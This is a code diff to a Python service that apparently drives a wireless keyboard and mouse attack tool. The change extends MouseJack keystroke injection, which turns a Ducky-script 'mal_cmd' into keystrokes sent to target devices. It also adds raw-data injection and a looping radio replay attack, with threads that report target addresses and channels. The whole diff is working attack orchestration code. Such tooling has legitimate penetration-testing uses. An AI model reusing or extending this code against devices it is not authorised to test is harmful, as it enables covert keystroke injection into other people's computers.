@@ -59,8 +59,9 @@ class Service(mp.Process):
                             payload = cmd['payload']
                             mode = cmd['mode']
                             targets = cmd['devices']
+                            parse = cmd['parse']
                             language = cmd['language']
-                            self.start_attack(vid, pid, physical_id, payload, mode, targets, language)
+                            self.start_attack(vid, pid, physical_id, payload, mode, parse, targets, language)
                         elif cmd_type == 'scan_stop' or cmd_type == 'attack_stop':
                             self.stop_action(physical_id)
                     else:
@@ -132,14 +133,15 @@ class Service(mp.Process):
             return
 
         info = self.action_threads[physical_id]
-        info['event'].set()
+        if info['event']:
+            info['event'].set()
         if info['thread'].is_alive():
             info['thread'].join(timeout=2.0)
 
         info['running'] = False
         del self.action_threads[physical_id]
 
-    def start_attack(self, vid, pid, physical_id, payload, mode, devices, language):
+    def start_attack(self, vid, pid, physical_id, payload, mode, parse, devices, language):
         if physical_id in self.action_threads or not devices:
             self.action_report(
                 'atk_fin', physical_id, vid, pid, {}, {
@@ -158,7 +160,7 @@ class Service(mp.Process):
             device_class = device_info['device']
             if device_class in valid_hid_classes:
                 valid_devices[addr] = device_info
-        if not valid_devices:
+        if not valid_devices and mode != 'Replay':
             self.action_report('atk_fin', physical_id, vid, pid, {}, {
                 'timestamp': self.data_ft.form_timestamp_str_in_year(),
                 'action': 'Invalid Device Action',
@@ -169,34 +171,35 @@ class Service(mp.Process):
             })
             return
 
+        func, args, t, stop_event = None, (), None, None
+
         if mode == 'Mousejack':
-            stop_event = threading.Event()
-            t = threading.Thread(
-                target=self.mousejack_attack,
-                args=(vid, pid, physical_id, devices, payload, language),
-                daemon=True
-            )
-            self.action_threads[physical_id] = {
-                'thread': t,
-                'event': stop_event,
-                'running': True
-            }
-            t.start()
+            if parse:
+                func = self.mousejack_attack
+                args = (vid, pid, physical_id, devices, payload, language,)
+            else:
+                func = self.rawdata_attack
+                args = (vid, pid, physical_id, devices, payload,)
         elif mode == 'Replay':
+            if parse:
+                func = self.replay_attack
+                args = (vid, pid, physical_id, devices,)
+            else:
+                func = self.replay_rawdata
+                args = (vid, pid, physical_id, devices, payload,)
+        if func:
             stop_event = threading.Event()
             t = threading.Thread(
-                target=self.replay_attack,
-                args=(vid, pid, physical_id, devices, stop_event),
+                target=func,
+                args=args + (stop_event,),
                 daemon=True
             )
+            t.start()
             self.action_threads[physical_id] = {
                 'thread': t,
                 'event': stop_event,
                 'running': True
             }
-            t.start()
-        else:
-            pass
 
     def scan(self, vid, pid, physical_id, stop_event):
         mj = MouseJack()
@@ -259,7 +262,7 @@ class Service(mp.Process):
             })
             mj.close()
 
-    def mousejack_attack(self, vid, pid, physical_id, targets, mal_cmd, language):
+    def mousejack_attack(self, vid, pid, physical_id, targets, mal_cmd, language, stop_event):
         mj = MouseJack()
         try:
             mal_code = duckyparser.DuckyParser(mal_cmd, language).parse()
@@ -271,6 +274,23 @@ class Service(mp.Process):
                 'timestamp': self.data_ft.form_timestamp_str_in_year(),
                 'action': 'Mousejack',
                 'payload': f'{mal_cmd}',
+                'target_address': mj.report_address(targets),
+                'target_channels': mj.report_channels(targets),
+                'target_hid': mj.report_hid(targets)
+            })
+            mj.close()
+
+    def rawdata_attack(self, vid, pid, physical_id, targets, payload, stop_event):
+        mj = MouseJack()
+        try:
+            mj.attack_with_rawdata(targets, payload)
+        except Exception as e:
+            self.error_report('Rawdata Attack Failed', e)
+        finally:
+            self.action_report('atk_fin', physical_id, vid, pid, {}, {
+                'timestamp': self.data_ft.form_timestamp_str_in_year(),
+                'action': 'Rawdata',
+                'payload': f'{payload}',
                 'target_address': mj.report_address(targets),
                 'target_channels': mj.report_channels(targets),
                 'target_hid': mj.report_hid(targets)
@@ -290,6 +310,25 @@ class Service(mp.Process):
                 'timestamp': self.data_ft.form_timestamp_str_in_year(),
                 'action': 'Replay',
                 'payload': rp.get_payload(targets),
+                'target_address': rp.report_address(targets),
+                'target_channels': rp.report_channels(targets),
+                'target_hid': ''
+            })
+            rp.close()
+
+    def replay_rawdata(self, vid, pid, physical_id, targets, payload, stop_event):
+        rp = Replayer()
+        try:
+            while not stop_event.is_set():
+                rp.attack_with_rawdata(targets, payload)
+                time.sleep(0.01)
+        except Exception as e:
+            self.error_report('Replay Attack Failed', e)
+        finally:
+            self.action_report('atk_fin', physical_id, vid, pid, {}, {
+                'timestamp': self.data_ft.form_timestamp_str_in_year(),
+                'action': 'Replay',
+                'payload': f'{payload}',
                 'target_address': rp.report_address(targets),
                 'target_channels': rp.report_channels(targets),
                 'target_hid': ''
